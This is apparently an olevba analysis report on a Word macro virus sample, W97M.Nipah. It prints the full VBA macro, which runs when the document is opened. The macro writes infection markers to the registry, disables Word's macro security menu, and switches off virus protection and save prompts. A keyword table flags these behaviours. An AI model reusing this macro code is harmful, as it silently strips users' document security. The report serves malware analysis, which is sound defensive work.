olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Emelia.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Emelia.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Nipah.bas 
in file: ./Virus.MSWord.Emelia.b - OLE stream: 'Macros/VBA/Nipah'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'======================================================
'  W97M.Nipah by Dr Virus Quest
'  Origin from Malaysia
'  Copyright©1999
'======================================================
Private Sub Document_Open()
On Error Resume Next

Set WshShell = CreateObject("WScript.Shell")

WshShell.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Nipah\Infection", 0, "Nipah"
WshShell.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Infection\Nipah", 0, "Nipah"
WshShell.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\Nipah", 0, "Nipah"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Nipah\VirusName", "Nipah"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Nipah\Creator", "Dr Virus Quest"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Nipah\Created", "09051999"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Nipah\Country", "Malaysia"

If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
  CommandBars("Macro").Controls("Security...").Enabled = False
  System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
  CommandBars("Tools").Controls("Macro").Enabled = False
  Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

